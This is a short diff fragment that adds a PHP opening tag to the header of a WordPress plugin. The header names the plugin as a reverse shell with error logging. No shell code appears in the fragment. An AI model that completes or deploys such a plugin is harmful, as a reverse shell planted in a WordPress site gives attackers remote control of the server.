@@ -1,3 +1,4 @@
+<?php
 /*
 Plugin Name: WP Rev Shell with Error Logging
 Description: Reverse Shell with Timestamp Logging(site/log.txt contains shell status and errors)
